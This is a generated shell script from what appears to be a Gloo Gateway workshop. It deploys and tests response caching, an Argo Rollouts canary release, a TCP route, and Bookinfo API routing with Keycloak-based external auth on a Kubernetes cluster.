timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: HttpListenerOption
metadata:
  name: cache
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: Gateway
    name: http
  options:
    caching:
      cachingServiceRef:
        name: caching-service
        namespace: gloo-system
EOF
cat <<'EOF' > ./test.js
const chaiHttp = require("chai-http");
const chai = require("chai");
const crypto = require("crypto")
const expect = chai.expect;

chai.use(chaiHttp);
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const httpbin = `https://httpbin.example.com`;
const cachepath = '/cache/1';
var path_key;

describe("response caching", function() {
  this.timeout(3000); // The test needs more than default (2secs)

  // Make the first request whose response will be cached
  beforeEach(function(done) {
    path_key = crypto.randomUUID();
    chai.request(httpbin).get(cachepath).query({key: path_key}).end((err, response) => {
      if (err) return done(err);
      done();
    });
  });

  it('returns a cached response within cache TTL', function(done) {
    setTimeout(() => {
      chai.request(httpbin).get(cachepath).query({key: path_key}).end((err, response) => {
        if (err) return done(err);
        try {
          expect(response).to.have.status(200);
          expect(response).to.have.header('age');
          done();
        } catch (e) {
          done(e);
        }
      });
    }, 100);
  });

  it('returns a fresh response beyond cache TTL', function(done) {
    setTimeout(() => {
      chai.request(httpbin).get(cachepath).query({key: path_key}).end((err, response) => {
        if (err) return done(err);
        try {
          expect(response).to.have.status(200);
          expect(response).to.not.have.header('age');
          done();
        } catch (e) {
          done(e);
        }
      });
    }, 2000);
  });

})

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/caching/tests/caching-applies.test.js.liquid from lab number 21"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=200 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
kubectl --context ${CLUSTER1} -n gloo-system delete httplisteneroption cache
helm upgrade --install argo-rollouts argo-rollouts \
  --repo https://argoproj.github.io/argo-helm \
  --version 2.38.2 \
  --kube-context ${CLUSTER1} \
  --namespace argo-rollouts \
  --create-namespace \
  --wait \
  -f -<<EOF
controller:
  trafficRouterPlugins:
  - name: "argoproj-labs/gatewayAPI"
    location: "https://github.com/argoproj-labs/rollouts-plugin-trafficrouter-gatewayapi/releases/download/v0.5.0/gatewayapi-plugin-linux-$(uname -m | sed 's/aarch/arm/' | sed 's/x86_/amd/')"
EOF
mkdir -p ${HOME}/bin
curl -Lo ${HOME}/bin/kubectl-argo-rollouts "https://github.com/argoproj/argo-rollouts/releases/latest/download/kubectl-argo-rollouts-$(uname | tr '[:upper:]' '[:lower:]')-$(uname -m | sed 's/aarch/arm/' | sed 's/x86_/amd/')"
chmod +x ${HOME}/bin/kubectl-argo-rollouts
export PATH=$HOME/bin:$PATH
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata:
  name: httpbin1
  namespace: httpbin
spec:
  replicas: 1
  selector:
    matchLabels:
      app: httpbin1
      version: v1
  strategy:
    canary:
      steps:
      - pause: {}
      - setWeight: 50
      - pause: {}
      - setWeight: 100
      - pause: {}
  template:
    metadata:
      labels:
        app: httpbin1
        version: v1
    spec:
      serviceAccountName: httpbin1
      containers:
      - name: httpbin
        image: mccutchen/go-httpbin:v2.13.4
        command: [ go-httpbin ]
        args:
          - "-max-duration"
          - "600s" # override default 10s
          - -use-real-hostname
        ports:
          - name: http
            containerPort: 8080
            protocol: TCP
        livenessProbe:
          httpGet:
            path: /status/200
            port: http
        readinessProbe:
          httpGet:
            path: /status/200
            port: http
        resources:
          limits:
            cpu: 1
            memory: 512Mi
          requests:
            cpu: 100m
            memory: 256Mi
        env:
        - name: K8S_MEM_LIMIT
          valueFrom:
            resourceFieldRef:
              divisor: "1"
              resource: limits.memory
        - name: GOMAXPROCS
          valueFrom:
            resourceFieldRef:
              divisor: "1"
              resource: limits.cpu
EOF

kubectl --context ${CLUSTER1} -n httpbin delete deployment httpbin1
echo -n Waiting for rollout to be ready...
timeout -v 5m bash -c "until [[ \$(kubectl argo rollouts --context ${CLUSTER1} -n httpbin status httpbin1 -t 1s 2>/dev/null) ]]; do
  sleep 1
  echo -n .
done"
echo
kubectl argo rollouts --context ${CLUSTER1} -n httpbin get rollout httpbin1
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: Service
metadata:
  name: httpbin1-canary
  namespace: httpbin
  labels:
    app: httpbin1
    service: httpbin1
spec:
  ports:
  - name: http
    port: 8000
    targetPort: http
    protocol: TCP
    appProtocol: http
  selector:
    app: httpbin1
EOF

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
        - name: httpbin1-canary
          port: 8000
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata:
  name: httpbin1
  namespace: httpbin
spec:
  replicas: 1
  selector:
    matchLabels:
      app: httpbin1
      version: v1
  strategy:
    canary:
      steps:
      - pause: {}
      - setWeight: 50
      - pause: {}
      - setWeight: 100
      - pause: {}
      stableService: httpbin1
      canaryService: httpbin1-canary
      trafficRouting:
        plugins:
          argoproj-labs/gatewayAPI:
            httpRoute: httpbin
            namespace: httpbin
  template:
    metadata:
      labels:
        app: httpbin1
        version: v1
    spec:
      serviceAccountName: httpbin1
      containers:
      - name: httpbin
        image: mccutchen/go-httpbin:v2.13.4
        command: [ go-httpbin ]
        args:
          - "-max-duration"
          - "600s" # override default 10s
          - -use-real-hostname
        ports:
          - name: http
            containerPort: 8080
            protocol: TCP
        livenessProbe:
          httpGet:
            path: /status/200
            port: http
        readinessProbe:
          httpGet:
            path: /status/200
            port: http
        resources:
          limits:
            cpu: 1
            memory: 512Mi
          requests:
            cpu: 100m
            memory: 256Mi
        env:
        - name: K8S_MEM_LIMIT
          valueFrom:
            resourceFieldRef:
              divisor: "1"
              resource: limits.memory
        - name: GOMAXPROCS
          valueFrom:
            resourceFieldRef:
              divisor: "1"
              resource: limits.cpu
EOF
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("httpbin rollout", () => {
  it("is at step 5 with canary weight 100 and stable image tag v2.13.4", () => {
    let cli = chaiExec(`kubectl argo rollouts --context ${process.env.CLUSTER1} -n httpbin get rollout httpbin1 --no-color`);
    expect(cli).to.exit.with.code(0);
    expect(cli).to.have.output.that.matches(new RegExp("\\bStatus:\\s+.+ Healthy\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bStep:\\s+5/5\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bActualWeight:\\s+100\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("mccutchen/go-httpbin:v2.13.4.+(stable)\\b"));
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 23"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

const canaryWeight = 0
const stableWeight = 100 - canaryWeight

describe("httproute weights for rollout canary weight 0", () => {
  it("has canary route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1-canary")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${canaryWeight}'`);
  });

  it("has stable route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${stableWeight}'`);
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 23"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
kubectl argo rollouts --context ${CLUSTER1} -n httpbin set image httpbin1 httpbin=mccutchen/go-httpbin:v2.14.0
echo -n Waiting for rollout to be ready...
timeout -v 5m bash -c "until [[ \$(kubectl --context ${CLUSTER1} -n httpbin get rollout httpbin1 -ojsonpath='{.status.currentStepIndex}' 2>/dev/null) -eq 0 ]]; do
  sleep 1
  echo -n .
done"
echo
kubectl argo rollouts --context ${CLUSTER1} -n httpbin get rollout httpbin1
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("httpbin rollout", () => {
  it("is at step 0 with canary weight 0 and stable image tag v2.13.4", () => {
    let cli = chaiExec(`kubectl argo rollouts --context ${process.env.CLUSTER1} -n httpbin get rollout httpbin1 --no-color`);
    expect(cli).to.exit.with.code(0);
    expect(cli).to.have.output.that.matches(new RegExp("\\bStatus:\\s+.+ Paused\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bStep:\\s+0/5\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bActualWeight:\\s+0\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("mccutchen/go-httpbin:v2.13.4.+(stable)\\b"));
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 23"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

const canaryWeight = 0
const stableWeight = 100 - canaryWeight

describe("httproute weights for rollout canary weight 0", () => {
  it("has canary route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1-canary")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${canaryWeight}'`);
  });

  it("has stable route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${stableWeight}'`);
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 23"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
kubectl argo rollouts --context ${CLUSTER1} -n httpbin promote httpbin1
echo -n Waiting for rollout to be ready...
timeout -v 5m bash -c "until [[ \$(kubectl --context ${CLUSTER1} -n httpbin get rollout httpbin1 -ojsonpath='{.status.currentStepIndex}' 2>/dev/null) -eq 2 ]]; do
  sleep 1
  echo -n .
done"
echo
kubectl argo rollouts --context ${CLUSTER1} -n httpbin get rollout httpbin1
kubectl --context ${CLUSTER1} -n httpbin describe httproute httpbin
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("httpbin rollout", () => {
  it("is at step 2 with canary weight 50 and stable image tag v2.13.4", () => {
    let cli = chaiExec(`kubectl argo rollouts --context ${process.env.CLUSTER1} -n httpbin get rollout httpbin1 --no-color`);
    expect(cli).to.exit.with.code(0);
    expect(cli).to.have.output.that.matches(new RegExp("\\bStatus:\\s+.+ Paused\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bStep:\\s+2/5\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bActualWeight:\\s+50\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("mccutchen/go-httpbin:v2.13.4.+(stable)\\b"));
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 23"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

const canaryWeight = 50
const stableWeight = 100 - canaryWeight

describe("httproute weights for rollout canary weight 50", () => {
  it("has canary route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1-canary")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${canaryWeight}'`);
  });

  it("has stable route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${stableWeight}'`);
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 23"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
kubectl argo rollouts --context ${CLUSTER1} -n httpbin promote httpbin1
echo -n Waiting for rollout to be ready...
timeout -v 5m bash -c "until [[ \$(kubectl -n httpbin get rollout httpbin1 -ojsonpath='{.status.currentStepIndex}' 2>/dev/null) -eq 4 ]]; do
  sleep 1
  echo -n .
done"
echo
kubectl -n httpbin describe httproute httpbin
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("httpbin rollout", () => {
  it("is at step 4 with canary weight 100 and stable image tag v2.13.4", () => {
    let cli = chaiExec(`kubectl argo rollouts --context ${process.env.CLUSTER1} -n httpbin get rollout httpbin1 --no-color`);
    expect(cli).to.exit.with.code(0);
    expect(cli).to.have.output.that.matches(new RegExp("\\bStatus:\\s+.+ Paused\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bStep:\\s+4/5\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bActualWeight:\\s+100\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("mccutchen/go-httpbin:v2.13.4.+(stable)\\b"));
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 23"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

const canaryWeight = 100
const stableWeight = 100 - canaryWeight

describe("httproute weights for rollout canary weight 100", () => {
  it("has canary route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1-canary")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${canaryWeight}'`);
  });

  it("has stable route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${stableWeight}'`);
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 23"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
kubectl argo rollouts --context ${CLUSTER1} -n httpbin promote httpbin1
echo -n Waiting for rollout to be ready...
timeout -v 5m bash -c "until [[ \$(kubectl -n httpbin get rollout httpbin1 -ojsonpath='{.status.currentStepIndex}' 2>/dev/null) -eq 5 ]]; do
  sleep 1
  echo -n .
  kubectl argo rollouts --context ${CLUSTER1} -n httpbin promote httpbin1
done"
echo
kubectl argo rollouts --context ${CLUSTER1} -n httpbin get rollout httpbin1
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("httpbin rollout", () => {
  it("is at step 5 with canary weight 100 and stable image tag v2.14.0", () => {
    let cli = chaiExec(`kubectl argo rollouts --context ${process.env.CLUSTER1} -n httpbin get rollout httpbin1 --no-color`);
    expect(cli).to.exit.with.code(0);
    expect(cli).to.have.output.that.matches(new RegExp("\\bStatus:\\s+.+ Healthy\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bStep:\\s+5/5\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("\\bActualWeight:\\s+100\\b"));
    expect(cli).to.have.output.that.matches(new RegExp("mccutchen/go-httpbin:v2.14.0.+(stable)\\b"));
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout-final.test.js.liquid from lab number 23"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

const canaryWeight = 0
const stableWeight = 100 - canaryWeight

describe("httproute weights for rollout canary weight 0", () => {
  it("has canary route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1-canary")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${canaryWeight}'`);
  });

  it("has stable route weight", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n httpbin get httproute httpbin -o jsonpath='{.spec.rules[0].backendRefs[?(@.name == "httpbin1")].weight}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.equal(`'${stableWeight}'`);
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 23"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
kubectl --context ${CLUSTER1} -n httpbin delete rollout httpbin1
kubectl --context ${CLUSTER1} -n httpbin delete svc httpbin1-canary
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: httpbin1
  namespace: httpbin
spec:
  replicas: 1
  selector:
    matchLabels:
      app: httpbin1
      version: v1
  template:
    metadata:
      labels:
        app: httpbin1
        version: v1
    spec:
      serviceAccountName: httpbin1
      containers:
      - name: httpbin
        image: mccutchen/go-httpbin:v2.14.0
        command: [ go-httpbin ]
        args:
          - "-max-duration"
          - "600s" # override default 10s
          - -use-real-hostname
        ports:
          - name: http
            containerPort: 8080
            protocol: TCP
        livenessProbe:
          httpGet:
            path: /status/200
            port: http
        readinessProbe:
          httpGet:
            path: /status/200
            port: http
        env:
        - name: K8S_MEM_LIMIT
          valueFrom:
            resourceFieldRef:
              divisor: "1"
              resource: limits.memory
        - name: GOMAXPROCS
          valueFrom:
            resourceFieldRef:
              divisor: "1"
              resource: limits.cpu
EOF

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: tcp
  namespace: gloo-system
spec:
  gatewayClassName: gloo-gateway
  listeners:
  - name: httpbin
    protocol: TCP
    port: 8080
    allowedRoutes:
      kinds:
      - kind: TCPRoute
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1alpha2
kind: TCPRoute
metadata:
  name: tcp-httpbin
  namespace: gloo-system
spec:
  parentRefs:
  - name: tcp
    sectionName: httpbin
  rules:
  - backendRefs:
    - name: httpbin1
      namespace: httpbin
      port: 8000
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1beta1
kind: ReferenceGrant
metadata:
  name: httpbin
  namespace: httpbin
spec:
  from:
  - group: gateway.networking.k8s.io
    kind: TCPRoute
    namespace: gloo-system
  to:
  - group: ""
    kind: Service
EOF
export TCP_PROXY_IP=$(kubectl --context ${CLUSTER1} -n gloo-system get svc gloo-proxy-tcp -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through TCP", () => {
  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `http://${process.env.TCP_PROXY_IP}:8080`, path: '/get', body: 'headers', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/tcp-route/tests/tcp.test.js.liquid from lab number 24"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 24"; exit 1; }
kubectl --context ${CLUSTER1} create ns bookinfo
kubectl --context ${CLUSTER1} -n bookinfo apply -f https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/platform/kube/bookinfo.yaml
kubectl --context ${CLUSTER1} -n bookinfo rollout status deploy --timeout=5m
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Bookinfo app", () => {
  let cluster = process.env.CLUSTER1
  let deployments = ["productpage-v1", "ratings-v1", "details-v1", "reviews-v1", "reviews-v3"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "bookinfo", k8sObj: deploy }));
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/deploy-bookinfo/tests/check-bookinfo.test.js.liquid from lab number 25"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
./scripts/register-domain.sh bookinfo.example.com ${PROXY_IP}
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: bookinfo
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https
  hostnames:
    - "bookinfo.example.com"
  rules:
    # If the request path starts with /api/bookinfo
    - matches:
      - path:
          type: PathPrefix
          value: /api/bookinfo
      # Delegate routing to bookinfo namespace
      backendRefs: 
        - name: '*'
          namespace: bookinfo
          group: gateway.networking.k8s.io
          kind: HTTPRoute
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: productpage-api-v1
  namespace: bookinfo
spec:
  rules:
    # If the request path starts with /api/bookinfo/v1
    - matches:
      - path:
          type: PathPrefix
          value: /api/bookinfo/v1
      # Route to the productpage service
      backendRefs:
        - name: productpage
          port: 9080
      # Rewrite the path
      filters:
        - type: URLRewrite
          urlRewrite:
            path:
              type: ReplacePrefixMatch
              replacePrefixMatch: /api/v1/products
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the API without authentication", () => {
  it('Checking text \'The Comedy of Errors\' in the response', () => helpersHttp.checkBody({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', body: 'The Comedy of Errors', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-no-auth.test.js.liquid from lab number 26"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: apis
  namespace: gloo-system
spec:
  configs:
    - oauth2:
        accessTokenValidation:
          jwt:
            remoteJwks:
              url: "${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/certs"
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption-apis
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: bookinfo
  options:
    # ExtAuth configuration
    extauth:
      configRef:
        name: apis
        namespace: gloo-system
    cors:
      allowCredentials: true
      allowHeaders:
      - "*"
      allowMethods:
      - GET
      allowOriginRegex:
      - ".*"
EOF
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API unauthorized", () => {
  it('Response code is 403', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', retCode: 403 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-unauthorized.test.js.liquid from lab number 26"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
export USER1_TOKEN=$(curl -Ssm 10 --fail-with-body \
  -d "client_id=${KEYCLOAK_CLIENT}" \
  -d "client_secret=${KEYCLOAK_SECRET}" \
  -d "username=user1" \
  -d "password=password" \
  -d "grant_type=password" \
  "$KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token" |
  jq -r .access_token)

echo export KEYCLOAK_CLIENT=${KEYCLOAK_CLIENT}
echo export KEYCLOAK_SECRET=${KEYCLOAK_SECRET}
echo export KEYCLOAK_URL=${KEYCLOAK_URL}
echo export USER1_TOKEN=${USER1_TOKEN}
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API authorized", () => {
  it('Response code is 200', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], retCode: 200 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-authorized.test.js.liquid from lab number 26"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: ratelimit.solo.io/v1alpha1
kind: RateLimitConfig
metadata:
  name: limit-apis
  namespace: gloo-system
